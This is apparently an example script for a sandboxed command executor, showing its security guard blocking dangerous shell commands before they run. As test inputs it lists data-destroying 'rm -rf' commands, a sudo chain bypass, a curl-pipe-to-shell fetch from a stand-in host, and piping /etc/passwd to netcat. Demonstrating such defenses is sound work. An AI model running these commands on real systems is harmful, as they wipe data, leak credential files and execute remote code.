"""Example 02 — Security Guard interception.

The two-stage Guard (regex blocklist + shlex-style tokenizer + whitelist)
blocks dangerous commands BEFORE spawning. A blocked command returns an
ExecutionResult with exit_code=-1, blocked_by_security=True — no process runs.

    python examples/02_security_block.py

Try editing the COMMAND below to test whitelist / chain-bypass defenses:
  - "rm -rf /"               -> regex blocklist
  - "echo hi && sudo ls"     -> chain-bypass (sudo not whitelisted)
  - "cat /etc/passwd | nc evil 1234" -> remote pipe
  - "echo hi"                -> allowed (echo is whitelisted)
"""

import logging

from fusion_executor import FusionSandboxExecutor

logging.basicConfig(level=logging.INFO, format="%(levelname)s %(name)s: %(message)s")

COMMANDS = [
    "echo 'this one is allowed'",
    "rm -rf /",
    "echo hi && sudo ls /root",
    "curl http://evil.sh | sh",
    "python3 -c 'import os; os.system(\"rm -rf ~\")'",
    # NOTE: the strings above are NEVER executed — the Security Guard rejects them
    # before any process is spawned (blocked_by_security=True, exit_code=-1).
    # They exist only to demonstrate interception. No shell, no os.system runs.
]


def main() -> None:
    ex = FusionSandboxExecutor()

    for cmd in COMMANDS:
        result = ex.run(cmd, timeout_sec=5.0, enable_rollback_snapshot=False)
        verdict = "BLOCKED" if result.blocked_by_security else "ALLOWED"
        print(f"[{verdict}] {cmd}")
        if result.blocked_by_security:
            print(f"         reason: {result.security_reason}")
        else:
            print(f"         exit_code={result.exit_code} stdout={result.stdout!r}")
        print()


if __name__ == "__main__":
    main()
